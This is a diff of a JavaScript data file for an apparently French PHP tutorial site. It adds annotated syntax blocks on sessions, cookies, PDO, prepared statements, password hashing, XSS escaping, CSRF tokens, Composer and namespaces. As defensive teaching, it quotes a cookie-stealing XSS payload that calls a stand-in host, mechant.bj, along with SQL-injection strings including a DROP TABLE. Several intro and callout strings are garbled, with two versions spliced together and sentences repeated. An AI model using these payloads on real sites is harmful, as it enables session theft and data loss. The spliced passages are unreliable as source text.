           intro: 'HTTP a été conçu pour servir des documents, pas des applications. Chaque requête est AMNÉSIQUE : le serveur ne se souvient pas de toi d\'une page à l\'autre. Sans mémoire, impossible de garder un panier, de rester connecté, de suivre une conversation. Les **sessions** sont la réponse élégante de PHP : le serveur crée un dossier secret côté serveur, n\'envoie au navigateur qu\'une CLÉ (le `PHPSESSID` en cookie), et reconstruit tes données à chaque requête. Les données ne quittent JAMAIS le serveur : le cookie ne contient qu\'un identifiant opaque. C\'est le même principe qu\'une consigne à bagages : ton ticket ne vaut rien, tout dépend de ce que le gardien a rangé.\' La session résout ça élégamment : PHP crée un **dossier côté serveur** (un identifiant + des données), n\'envoie au navigateur qu\'un **cookie d\'ID** (`PHPSESSID`), et à chaque requête, il retrouve le dossier. Les données, elles, ne quittent jamais le serveur.',
           blocks: [
             { t: 'h3', h: 'Le mécanisme en trois coups' },
+            { t: 'syntax', title: 'session_start et $_SESSION, décortiqués', lang: 'php', code:
+'session_start();\n$_SESSION["user_id"] = 42;\n$_SESSION["panier"] ??= [];', legend: [
+              ['session_start()', 'AVANT TOUT AFFICHAGE : démarre ou reprend la session — sinon « headers already sent », l\'erreur la plus célèbre de PHP'],
+              ['$_SESSION', 'le tableau PERSISTANT entre les requêtes : ce qu\'on y range survit au clic suivant — la mémoire du visiteur'],
+              ['??= []', 'initialise SI ABSENT : le panier existera au premier article, sans if encombrant'],
+              ['côté serveur', 'les données vivent SUR LE SERVEUR ; le navigateur ne transporte qu\'un identifiant (PHPSESSID) dans un cookie'],
+              ['session_regenerate_id(true)', 'au LOGIN, toujours : nouveau ticket, ancien brûlé — l\'attaque par fixation de session est neutralisée']
+            ]},
             { t: 'ol', items: [
               '1re visite : `session_start()` crée un ID aléatoire et le met en cookie (`Set-Cookie: PHPSESSID=…`)',
               'le navigateur renvoie ce cookie à CHAQUE requête suivante',
@@ -1171,6 +1386,14 @@ DEVDOCS.php.categories.push(
             { t: 'code', lang: 'php', code:
 '// POSER (avant tout output — c\'est un en-tête !)\nsetcookie(\n    "theme",                        // nom\n    "sombre",                       // valeur (string, sérialise le reste toi-même)\n    time() + 60 * 60 * 24 * 30,     // expiration UNIX : +30 jours\n    "/",                            // path : visible sur tout le site\n);\n\n// LIRE : à la requête SUIVANTE (le cookie doit faire le voyage aller-retour)\n$theme = $_COOKIE["theme"] ?? "clair";\n\n// SUPPRIMER : même nom + expiration dans le passé\nsetcookie("theme", "", time() - 3600, "/");' },
             { t: 'h3', h: 'Les trois flags qui changent tout' },
+            { t: 'syntax', title: 'setcookie avec les trois verrous', lang: 'php', code:
+'setcookie("prefs", $json, [\n    "expires"  => time() + 86400 * 30,\n    "path"     => "/",\n    "secure"   => true,\n    "httponly" => true,\n    "samesite" => "Lax",\n]);', legend: [
+              ['setcookie(…)', 'pose le cookie — AVANT tout affichage, comme session_start : les headers partent une seule fois'],
+              ['"expires" => time() + 86400*30', 'la durée de vie en SECONDES depuis maintenant (ici 30 jours) — sans expires, le cookie meurt à la fermeture du navigateur'],
+              ['"httponly" => true', 'invisible pour JavaScript : un script injecté ne peut plus voler le cookie — TOUJOURS pour les cookies sensibles'],
+              ['"secure" => true', 'ne voyage QU\'EN HTTPS : plus jamais lisible en clair sur le réseau'],
+              ['"samesite" => "Lax"', 'anti-CSRF natif : le cookie ne suit pas les requêtes postées depuis un site tiers']
+            ]},
             { t: 'code', lang: 'php', code:
 '// Forme tableau (PHP 7.3+) — la plus lisible :\nsetcookie("panier", $token, [\n    "expires"  => time() + 60 * 60 * 24 * 7,\n    "path"     => "/",\n    "secure"   => true,     // HTTPS uniquement (pas d\'écoute en clair)\n    "httponly" => true,     // invisible pour document.cookie (anti-vol XSS)\n    "samesite" => "Lax",    // pas envoyé sur POST/iframe cross-site (anti-CSRF)\n]);' },
             { t: 'table', head: ['Flag', 'Protège contre', 'Sans lui'], rows: [
@@ -1222,6 +1445,14 @@ DEVDOCS.php.categories.push(
           intro: 'Avant, chaque base de données avait son propre mode d\'emploi en PHP. `mysql_query()` pour MySQL, `pg_query()` pour PostgreSQL, `sqlite_query()` pour SQLite — trois API différentes pour faire la même chose. **PDO** (PHP Data Objects) a unifié tout ça en 2005 : une interface unique, un seul jeu de méthodes (`prepare`, `execute`, `fetch`), et il suffit de changer UNE ligne (le DSN) pour passer de MySQL à PostgreSQL. Apprendre PDO une fois = savoir parler à 12 bases de données différentes. Mais PDO a un piège d\'héritage : par défaut, il avale les erreurs en silence. La configuration minimale — `ERRMODE_EXCEPTION` — n\'est pas optionnelle, c\'est la première ligne de tout projet.\', et **PDO** (PHP Data Objects) : une interface unique qui dialogue avec la plupart des bases via des pilotes. Apprendre PDO une fois = savoir parler à MySQL, PostgreSQL ou SQLite avec le même code. Mais une PDO mal configurée **avale les erreurs en silence** — d\'où la liste d\'options non négociable.',
           blocks: [
             { t: 'h3', h: 'Se connecter : le DSN' },
+            { t: 'syntax', title: 'La connexion PDO, ligne par ligne', lang: 'php', code:
+'$pdo = new PDO(\n    "mysql:host=localhost;dbname=boutique;charset=utf8mb4",\n    $user,\n    $pass,\n    [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]\n);', legend: [
+              ['new PDO($dsn, …)', 'l\'objet CONNEXION : une porte universelle — même code pour MySQL, PostgreSQL, SQLite, seul le DSN change'],
+              ['"mysql:host=…;dbname=…"', 'le DSN : l\'ADRESSE complète de la base en une chaîne — pilote, hôte, base, charset'],
+              ['charset=utf8mb4', 'les accents ET les emojis intacts : sans lui, tes données partent en caractères de remplacement'],
+              ['ERRMODE_EXCEPTION', 'CHAQUE erreur SQL devient une exception attrapable : LE réglage nº 1, jamais négociable en 2026'],
+              ['$user / $pass en variables', 'les identifiants viennent d\'un fichier NON versionné (.env) — jamais en dur dans le code poussé sur Git']
+            ]},
             { t: 'code', lang: 'php', code:
 '// DSN = Data Source Name : pilote:hôte;base;jeu de caractères\n$dsn = "mysql:host=localhost;dbname=boutique_dantokpa;charset=utf8mb4";\n\ntry {\n    $pdo = new PDO($dsn, $user, $pass, [\n        // 1. LES ERREURS LÈVENT DES EXCEPTIONS (défaut historique : silence !)\n        PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,\n        // 2. fetch() rend des tableaux ASSOCIATIFS par défaut\n        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,\n        // 3. Vraies requêtes préparées côté serveur (pas émulées)\n        PDO::ATTR_EMULATE_PREPARES   => false,\n    ]);\n    echo "Connecté à MySQL " . $pdo->getAttribute(PDO::ATTR_SERVER_VERSION);\n} catch (PDOException $e) {\n    error_log($e->getMessage());       // les détails : pour les logs\n    exit("Boutique momentanément fermée.");  // pour les visiteurs\n}' },
             { t: 'callout', kind: 'warn', h: 'Sans `ERRMODE_EXCEPTION`, chaque appel retourne `false` en cas d\'échec **sans rien dire** : les bugs se découvrent dix lignes plus loin, quand `fetch()` explose sur un booléen. Pourquoi ce mode silencieux est-il le DÉFAUT ? Parce que PDO a été conçu en 2005, à une époque où PHP n\'avait pas encore d\'exceptions robustes (elles sont arrivées avec PHP 5). Le mode silencieux était un compromis de compatibilité. Vingt ans plus tard, ce défaut historique est toujours là — et c\'est à TOI de le corriger en ajoutant `PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION`. C\'est LA première ligne de configuration de toute connexion PDO, sans exception. : les bugs se découvrent dix lignes plus loin, quand `fetch()` explose sur un booléen. C\'est L\'option à écrire les yeux fermés.' },
@@ -1262,6 +1493,13 @@ DEVDOCS.php.categories.push(
             { t: 'code', lang: 'php', code:
 '// CE QU\'IL NE FAUT JAMAIS ÉCRIRE :\n$ville = $_GET["ville"];\n$sql = "SELECT * FROM clients WHERE ville = \'" . $ville . "\'";\n// ville saisie : Cotonou\' OR \'1\'=\'1\n// SQL final : WHERE ville = \'Cotonou\' OR \'1\'=\'1\'  → TOUTE la table !\n// variantes : \'; DROP TABLE clients; --   · login sans mot de passe…' },
             { t: 'h3', h: 'prepare + execute : la forteresse' },
+            { t: 'syntax', title: 'La requête préparée, étape par étape', lang: 'php', code:
+'$stmt = $pdo->prepare("SELECT * FROM produits WHERE id = :id");\n$stmt->execute(["id" => $_GET["id"]]);\n$produit = $stmt->fetch();', legend: [
+              ['prepare("… WHERE id = :id")', 'la requête part D\'ABORD, sans données : la structure SQL est figée chez le serveur de base'],
+              [':id', 'le MARQUEUR nommé : une case à remplir — JAMAIS de variable concaténée dans le SQL, c\'est toute la défense'],
+              ['execute(["id" => $_GET["id"]])', 'les VALEURS voyagent SÉPARÉMENT : même un $_GET piégé ne détourne plus la requête — l\'injection SQL meurt ici'],
+              ['$stmt->fetch()', 'la prochaine LIGNE en tableau associatif (ou false) ; fetchAll() pour tout d\'un coup']
+            ]},
             { t: 'code', lang: 'php', code:
 '// 1. La requête part SEULE, avec des marqueurs\n$stmt = $pdo->prepare("SELECT * FROM clients WHERE ville = :ville");\n\n// 2. Les données partent APRÈS, clairement étiquetées "données"\n$stmt->execute(["ville" => $_GET["ville"] ?? ""]);\n\n$clients = $stmt->fetchAll();\n\n// Forme raccourcie pour les simples :\n$stmt = $pdo->prepare("SELECT * FROM produits WHERE prix < ?");\n$stmt->execute([$prix_max]);           // marqueur positionnel ?' },
             { t: 'callout', kind: 'tip', h: 'Préfère les **marqueurs nommés** (`:ville`) aux positionnels dès qu\'il y en a plus d\'un : le tableau associatif d\'execute rend l\'ordre sans importance et la relecture immédiate.' },
@@ -1298,6 +1536,14 @@ DEVDOCS.php.categories.push(
             { t: 'code', lang: 'php', code:
 '// UNE ligne (fetch = suivante ou false)\n$stmt = $pdo->prepare("SELECT * FROM produits WHERE id = ?");\n$stmt->execute([$id]);\n$produit = $stmt->fetch();               // tableau associatif ou false\nif (!$produit) { /* 404 */ }\n\n// TOUTES les lignes\n$produits = $pdo->query(\n    "SELECT id, nom, prix, stock FROM produits ORDER BY nom"\n)->fetchAll();' },
             { t: 'h3', h: 'U — Update : avec WHERE, TOUJOURS' },
+            { t: 'syntax', title: 'L\'UPDATE sécurisé, décortiqué', lang: 'php', code:
+'$stmt = $pdo->prepare("UPDATE produits SET stock = stock - 1 WHERE id = :id");\n$stmt->execute(["id" => $id]);\nif ($stmt->rowCount() === 0) {\n    // rien touché : id inconnu ?\n}', legend: [
+              ['SET stock = stock - 1', 'le calcul SE FAIT dans la base : atomique — deux vendeuses simultanées ne perdront pas un article au passage'],
+              ['WHERE id = :id', 'TOUJOURS : un UPDATE sans WHERE rectifie LA TABLE ENTIÈRE — le cauchemar classique en une ligne'],
+              ['prepare + execute', 'même forteresse que le SELECT : marqueurs nommés, valeurs séparées — on ne négocie pas'],
+              ['rowCount()', 'le nombre de lignes VRAIMENT touchées : 0 = id inconnu ou rien n\'a changé — à vérifier après chaque Update/Delete'],
+              ['lastInsertId()', 'son frère pour le Create : l\'id AUTO-INCRÉMENT que la base vient d\'attribuer — indispensable pour enchaîner']
+            ]},
             { t: 'code', lang: 'php', code:
 '$stmt = $pdo->prepare(\n    "UPDATE produits SET prix = :prix, stock = :stock WHERE id = :id"\n);\n$stmt->execute(["prix" => 550, "stock" => 8, "id" => $id]);\necho $stmt->rowCount();   // lignes RÉELLEMENT modifiées (0 si idem/absent)' },
             { t: 'h3', h: 'D — Delete : mesuré et vérifié' },
@@ -1335,6 +1581,14 @@ DEVDOCS.php.categories.push(
           intro: 'La règle est absolue et ne supporte aucune exception : **un mot de passe ne se stocke JAMAIS**. Ni en clair (la base fuit ? tous les comptes sont pillés), ni « chiffré » (réversible = réversible par l\'attaquant aussi), ni en MD5/SHA1 (cassable en secondes sur un GPU moderne). On stocke une **empreinte** — le résultat d\'une fonction à sens unique, volontairement LENTE, qui rend impossible de retrouver l\'original. PHP fournit cette machine depuis 2014 avec **`password_hash`** (bcrypt, sel intégré, coût réglable) et **`password_verify`** (comparaison en temps constant). Depuis PHP 5.5, il n\'existe AUCUNE bonne raison d\'utiliser autre chose.\' invérifiable en sens inverse. PHP fournit cette machine avec **`password_hash`** (bcrypt, sel aléatoire intégré) et **`password_verify`** (comparaison en temps constant). Depuis PHP 5.5, il n\'existe **aucune bonne raison** d\'y déroger — ni md5, ni sha1, ni « chiffrement maison ».',
           blocks: [
             { t: 'h3', h: 'Inscription : hacher' },
+            { t: 'syntax', title: 'Hacher puis vérifier : le duo indissociable', lang: 'php', code:
+'// inscription\n$hash = password_hash($_POST["pass"], PASSWORD_DEFAULT);\n// connexion\nif (password_verify($_POST["pass"], $hash)) {\n    // identité confirmée\n}', legend: [
+              ['password_hash($clair, PASSWORD_DEFAULT)', 'HACHE le mot de passe : bcrypt aujourd\'hui, meilleur demain — DEFAULT suit l\'état de l\'art tout seul'],
+              ['sens UNIQUE', 'un hash ne se DÉCHIFFRE pas : même toi, administrateur, ne peux pas relire le mot de passe — et c\'est voulu'],
+              ['password_verify($clair, $hash)', 'la VÉRIFICATION appairée : rehache la saisie et compare en temps constant (anti timing-attack)'],
+              ['jamais md5/sha1', 'trop rapides, cassés depuis longtemps : password_hash/password_verify sont les SEULS réflexes acceptables'],
+              ['stockage', 'range le $hash (≈ 60 caractères) en VARCHAR(255) : les algorithmes futurs produiront des hashs plus longs']
+            ]},
             { t: 'code', lang: 'php', code:
 '// À l\'inscription :\n$hash = password_hash($_POST["mdp"], PASSWORD_DEFAULT);\n// → $2y$10$N9qo8uLOickgx2ZMRZoMye…  (algo + coût + SEL + empreinte, tout en un)\n\n$stmt = $pdo->prepare("INSERT INTO users (email, mdp_hash) VALUES (?, ?)");\n$stmt->execute([$email_valide, $hash]);\n// ⚠ colonne VARCHAR(255) : la chaîne fait ~60 caractères ET GRANDIRA\n// avec les futurs algorithmes par défaut.' },
             { t: 'h3', h: 'Connexion : vérifier' },
@@ -1374,6 +1628,14 @@ DEVDOCS.php.categories.push(
             { t: 'code', lang: 'php', code:
 '// Le livre d\'or naïf :\n$avis = $_POST["avis"];           // saisi par un visiteur\necho "<p>$avis</p>";\n\n// Un « joli » avis saisi :\n// <script>fetch("https://mechant.bj/vol?c=" + document.cookie)\n// → exécuté chez CHAQUE visiteur qui lit la page !\n// (même <img src=x onerror=…> marche sans aucune balise script)' },
             { t: 'h3', h: 'La parade centrale' },
+            { t: 'syntax', title: 'htmlspecialchars : échapper à l\'affichage', lang: 'php', code:
+'<p>Bonjour <?= htmlspecialchars($nom, ENT_QUOTES, "UTF-8") ?></p>\n<input value="<?= htmlspecialchars($saisie) ?>">', legend: [
+              ['htmlspecialchars($texte)', 'TRANSFORME les caractères dangereux (< > & " \') en entités : le script injecté devient du simple TEXTE affiché'],
+              ['<?= … ?>', 'la balise courte d\'affichage : <?= $x ?> équivaut à <?php echo $x; ?>'],
+              ['ENT_QUOTES', 'échappe AUSSI guillemets et apostrophes : INDISPENSABLE dès qu\'on affiche dans un attribut (value="", title="")'],
+              ['à L\'AFFICHAGE, pas au stockage', 'on stocke BRUT en base, on ÉCHAPPE en sortie : la parade vit ici, à chaque echo — le réflexe qui tue la XSS'],
+              ['non protégé ici', 'dans une URL (href), un style, un bloc `<script>` : d\'autres contextes exigent d\'autres échappements — section suivante']
+            ]},
             { t: 'code', lang: 'php', code:
 '// Echapper À L\'AFFICHAGE, en citant le charset et ENT_QUOTES :\necho "<p>" . htmlspecialchars($avis, ENT_QUOTES, "UTF-8") . "</p>";\n// < devient &lt; > devient &gt; " et \' deviennent des entités\n// → le texte reste du TEXTE, jamais du code' },
             { t: 'callout', kind: 'tip', h: 'Marre de la verbosité ? Deux réflexes pérennes : ① une petite fonction `e($s)` enveloppant htmlspecialchars à utiliser PARTOUT (`<?= e($avis) ?>`) ; ② à terme, un moteur de templates qui échappe par défaut — c\'est l\'une des qualités de Blade côté Laravel.' },
@@ -1414,6 +1676,14 @@ DEVDOCS.php.categories.push(
           intro: 'Tu es connecté à ta boutique au marché Dantokpa. Dans un autre onglet, tu visites un site de recettes de gari. Ce site, sans que tu le saches, contient un formulaire invisible qui envoie `POST /supprimer-mon-compte` vers TA boutique. Ton navigateur joint automatiquement TES cookies de session — le serveur voit UNE REQUÊTE AUTHENTIFIÉE et exécute la suppression. C\'est la **CSRF** (Cross-Site Request Forgery) : un site tiers fait agir ton navigateur À TON INSU. La parade : faire en sorte que chaque action sensible exige un SECRET que seul TON formulaire peut connaître — un **jeton CSRF**, généré aléatoirement, stocké en session, et vérifié avant toute action destructive.\' qui soumet **en cachette** un formulaire POST vers /supprimer — ton navigateur joint **automatiquement tes cookies**, et le serveur y voit… toi. C\'est la **CSRF** (Cross-Site Request Forgery). La parade : exiger un **secret présent dans le formulaire** qu\'un site tiers ne peut pas connaître ni lire — le jeton CSRF.',
           blocks: [
             { t: 'h3', h: 'Générer et afficher le jeton' },
+            { t: 'syntax', title: 'Le jeton CSRF : générer, cacher, vérifier', lang: 'php', code:
+'$_SESSION["csrf"] ??= bin2hex(random_bytes(32));\n\n// dans le formulaire :\n<input type="hidden" name="csrf" value="<?= $_SESSION["csrf"] ?>">\n\n// avant d\'agir :\nif (!hash_equals($_SESSION["csrf"], $_POST["csrf"] ?? "")) {\n    exit("Jeton invalide");\n}', legend: [
+              ['bin2hex(random_bytes(32))', 'le JETON secret : imprévisible et unique par session — la signature que SEUL ton site peut produire'],
+              ['random_bytes', 'le hasard CRYPTOGRAPHIQUE : rand() et mt_rand() sont prévisibles — jamais pour la sécurité'],
+              ['type="hidden"', 'le champ caché TRANSPORTE le jeton avec le formulaire — invisible pour l\'utilisateur, lisible par le serveur'],
+              ['hash_equals($a, $b)', 'la comparaison EN TEMPS CONSTANT : à l\'abri des timing-attacks — jamais un simple == ici'],
+              ['pourquoi ça marche', 'le site piège de l\'attaquant peut FAIRE poster le navigateur… mais il ne CONNAÎT PAS le jeton de ta session']
+            ]},
             { t: 'code', lang: 'php', code:
 'session_start();\n\n// Une fois par session (régénérable) :\nif (empty($_SESSION["csrf"])) {\n    $_SESSION["csrf"] = bin2hex(random_bytes(32));\n}\n?>\n<form method="post" action="/profil/supprimer">\n  <!-- le secret voyage DANS le formulaire, invisible -->\n  <input type="hidden" name="csrf" value="<?= $_SESSION["csrf"] ?>">\n  <button>Supprimer mon compte</button>\n</form>' },
             { t: 'h3', h: 'Vérifier AVANT d\'agir — avec hash_equals' },
@@ -1467,6 +1737,14 @@ DEVDOCS.php.categories.push(
 '{\n    "name": "awa/boutique-dantokpa",\n    "description": "Catalogue de marché en PHP natif",\n    "require": {\n        "php": ">=8.2",\n        "guzzlehttp/guzzle": "^7.8"\n    },\n    "autoload": {\n        "psr-4": {\n            "App\\\\": "src/"\n        }\n    }\n}' },
             { t: 'callout', kind: 'tip', h: '`^7.8` = « compatible 7.x, sans cassure » (≥ 7.8, < 8.0). C\'est le **semantic versioning** (semver) : `MAJEUR.MINEUR.PATCH`. Le `^` (caret) autorise les montées de version MINEUR et PATCH — corrections de bugs et nouvelles fonctionnalités rétrocompatibles. Le `~` (tilde) est plus restrictif : patchs uniquement. `7.8.0` (exact) verrouille totalement. Choisir `^7.8` plutôt que `7.8.0`, c\'est dire « je fais confiance à cette bibliothèque pour ne pas casser son API dans la version 7 ». Le `composer.lock`, lui, fige les versions EXACTES installées pour que toute l\'équipe ait les mêmes dépendances au bit près. (≥ 7.8, < 8.0). `composer.lock` fige les versions EXACTES installées : on le **commite**, pour que chaque machine (ton binôme, la prod) exécute le même code au bit près.' },
             { t: 'h3', h: 'PSR-4 : adieu les require' },
+            { t: 'syntax', title: 'PSR-4 : la carte de l\'autoload, décortiquée', lang: 'php', code:
+'// composer.json\n"autoload": {\n    "psr-4": { "App\\\\": "src/" }\n}\n\n// src/Services/Paiement.php\nnamespace App\\Services;\nclass Paiement { /* … */ }\n\n// partout ailleurs, un seul require :\nrequire __DIR__ . "/vendor/autoload.php";', legend: [
+              ['"App\\\\": "src/"', 'la CORRESPONDANCE : le préfixe de namespace App\\ pointe le dossier src/ — l\'autoloader fait le reste'],
+              ['PSR-4', 'la convention d\'OR : namespace = arborescence, nom de classe = nom de fichier. Plus JAMAIS de require à la main'],
+              ['composer dump-autoload', 'après chaque changement du composer.json : régénère la carte de l\'autoload'],
+              ['vendor/autoload.php', 'le SEUL require qui reste en vie : ensuite, toute classe se charge toute seule à la première utilisation'],
+              ['composer require fakerphp/faker', 'ajouter une LIBRAIRIE externe : téléchargée dans vendor/, autoloadée comme tes propres classes']
+            ]},
             { t: 'p', h: 'Le standard PSR-4 lie un **namespace** à un **dossier** : `App\` ↔ `src/`. Dès lors, `new App\Boutique\Panier()` fait charger automatiquement `src/Boutique/Panier.php` — la fin des longues listes d\'include (fiche Namespaces pour les règles).' },
             { t: 'code', lang: 'php', label: 'public/index.php', code:
 '<?php\nrequire __DIR__ . "/../vendor/autoload.php";   // LA seule inclusion écrite\n\nuse App\Boutique\Panier;\nuse GuzzleHttp\Client;\n\n$panier = new Panier();       // src/Boutique/Panier.php chargé tout seul ✓\n$http   = new Client();       // idem, depuis vendor/guzzlehttp/' },
@@ -1511,6 +1789,14 @@ DEVDOCS.php.categories.push(
             { t: 'code', lang: 'php', label: 'api/produits.php', code:
 '<?php\nheader("Content-Type: application/json; charset=utf-8");\nrequire_once dirname(__DIR__) . "/bootstrap.php";    // $pdo partagé\n\n$methode = $_SERVER["REQUEST_METHOD"];\n$id = isset($_GET["id"]) ? (int) $_GET["id"] : null;\n\ntry {\n    match (true) {\n        $methode === "GET"    && $id   => lire_un($pdo, $id),\n        $methode === "GET"             => lire_tous($pdo),\n        $methode === "POST"            => creer($pdo),\n        $methode === "DELETE" && $id   => supprimer($pdo, $id),\n        default => repondre(405, ["erreur" => "Méthode non autorisée"]),\n    };\n} catch (Throwable $e) {\n    error_log($e);\n    repondre(500, ["erreur" => "Erreur serveur"]);\n}' },
             { t: 'h3', h: 'Les fonctions qui font le travail' },
+            { t: 'syntax', title: 'Répondre en JSON, ligne par ligne', lang: 'php', code:
+'header("Content-Type: application/json; charset=utf-8");\nhttp_response_code(201);\necho json_encode($commande, JSON_UNESCAPED_UNICODE);', legend: [
+              ['header("Content-Type: application/json")', 'ANNONCE le format avant tout affichage : le client sait décoder dès la première ligne — pas de HTML autour !'],
+              ['http_response_code(201)', 'le STATUT parle au client : 200 ok, 201 créé, 400 mauvaise requête, 404 introuvable, 422 données invalides'],
+              ['json_encode($data)', 'SÉRIALISE PHP → texte JSON : l\'exact inverse de json_decode côté réception'],
+              ['JSON_UNESCAPED_UNICODE', 'les accents passent EN CLAIR ("é" au lieu de \\u00e9) : JSON lisible ET standard'],
+              ['exit ensuite', 'une API répond UNE fois : après le echo du JSON, exit — aucun footer HTML ne doit polluer la réponse']
+            ]},
             { t: 'code', lang: 'php', code:
 'function repondre(int $code, array $donnees): void   // LE réflexe : point\n{                                                    // de sortie unique\n    http_response_code($code);\n    echo json_encode($donnees, JSON_UNESCAPED_UNICODE | JSON_THROW_ON_ERROR);\n    exit;\n}\n\nfunction lire_un(PDO $pdo, int $id): void\n{\n    $stmt = $pdo->prepare("SELECT id, nom, prix, stock FROM produits WHERE id = ?");\n    $stmt->execute([$id]);\n    $produit = $stmt->fetch();\n    $produit\n        ? repondre(200, $produit)\n        : repondre(404, ["erreur" => "Produit introuvable"]);\n}\n\nfunction creer(PDO $pdo): void\n{\n    // Le corps JSON n\'est PAS dans $_POST : il se lit dans php://input\n    $donnees = json_decode(file_get_contents("php://input"), true,\n                           512, JSON_THROW_ON_ERROR);\n    // …validation (fiche dédiée)…\n    $stmt = $pdo->prepare("INSERT INTO produits (nom, prix) VALUES (?, ?)");\n    $stmt->execute([$donnees["nom"], $donnees["prix"]]);\n    repondre(201, ["id" => (int) $pdo->lastInsertId()]);\n}' },
             { t: 'h3', h: 'JSON : les deux options qui sauvent' },
@@ -1559,6 +1845,14 @@ DEVDOCS.php.categories.push(
             { t: 'code', lang: 'php', label: 'src/Boutique/Panier.php', code:
 '<?php\nnamespace App\\Boutique;          // TOUJOURS la première instruction\n\nclass Panier\n{\n    // Nom COMPLET de la classe : App\\Boutique\\Panier\n    public function __construct(public array $articles = []) {}\n}' },
             { t: 'h3', h: 'Consommer : use et les alias' },
+            { t: 'syntax', title: 'namespace / use / alias, décortiqués', lang: 'php', code:
+'namespace App\\Services;\n\nuse App\\Models\\Produit;\nuse App\\Utils\\Logger as Log;\n\n$p = new Produit();   // en réalité : App\\Models\\Produit\nLog::info("ok");', legend: [
+              ['namespace App\\Services', 'EN PREMIÈRE LIGNE : l\'adresse du code dans l\'univers du projet — fini les noms géants anti-collision'],
+              ['use App\\Models\\Produit', 'l\'IMPORT : le nom court Produit remplace le chemin complet dans TOUT le fichier'],
+              ['as Log', 'l\'ALIAS : quand deux classes portent le même nom — ici Logger devient Log, conflit évité'],
+              ['App\\Models\\Produit', 'le NOM COMPLET (FQN) : l\'adresse absolue — use n\'est qu\'un raccourci d\'écriture, rien n\'est « chargé » par lui'],
+              ['\\DateTime', 'l\'antislash INITIAL : « remonte à la racine » — pour appeler une classe globale PHP depuis l\'intérieur d\'un namespace']
+            ]},
             { t: 'code', lang: 'php', code:
 '<?php\nrequire __DIR__ . "/vendor/autoload.php";\n\nuse App\\Boutique\\Panier;\nuse App\\Boutique\\Client;\nuse GuzzleHttp\\Client as HttpClient;    // alias : deux "Client" cohabitent !\n\n$panier = new Panier();                  // App\\Boutique\\Panier\n$client = new Client();                  // App\\Boutique\\Client\n$http   = new HttpClient();              // GuzzleHttp\\Client\n\n// Sans use : le nom COMPLET, mené par l\'antislash initial\n$date = new \\DateTimeImmutable();       // (les classes natives vivent à la RACINE)' },
             { t: 'callout', kind: 'info', h: '**Résolution relative** : dans `namespace App\Boutique;`, écrire `new Panier()` vise `App\Boutique\Panier`. Pour viser une classe globale (DateTime, PDO, Exception) sans `use`, préfixe d\'un `\` : `new \PDO(...)`. **Fonctions et constantes**, elles, retombent automatiquement sur l\'espace global : `strlen()` marche partout sans import.' },
